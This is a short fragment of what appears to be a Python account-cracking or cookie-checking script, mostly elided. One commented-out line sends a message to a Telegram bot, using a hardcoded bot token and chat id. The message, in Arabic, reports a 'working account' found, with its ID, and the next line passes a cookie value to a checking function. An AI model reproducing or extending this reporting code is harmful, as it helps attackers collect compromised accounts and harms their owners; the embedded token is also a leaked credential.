...
- # [ NXSTY BOOD ]  
	...
	#				requests.get(f"https://api.telegram.org/bot6380713142:AAF-TPzbq9kqbVGAPtXuQWMsgmVVjy3swc8/sendMessage?chat_id=6189811291&text= صاحب الايدي صاد حساب  شغال{ID}✔️{ok}\n   ")
					cek_apk(kuki)
